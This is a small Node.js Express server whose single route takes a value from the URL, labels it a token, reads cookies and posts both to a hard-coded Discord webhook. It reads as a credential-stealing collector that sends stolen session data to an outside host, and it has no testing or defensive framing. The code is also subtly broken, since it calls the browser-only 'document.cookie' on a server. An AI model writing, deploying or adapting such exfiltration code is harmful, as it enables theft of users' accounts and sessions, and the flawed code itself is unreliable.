const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = 3000;

app.get('/:t', (req, res) => {
    const token = req.params.t;
    const cookies = document.cookie;
    fetch('https://discord.com/api/webhooks/1566832143152316450/ZmyQo0Stt6Qmx3BaDi0wU2qtPxq8-QwVJwfwdXvjiZ5DS-hltxSopqgdBacUIrUTWE6K', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: `Token: ${token}\nCookies: ${cookies}` }),
    });
    res.send('Command received and processed.');
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
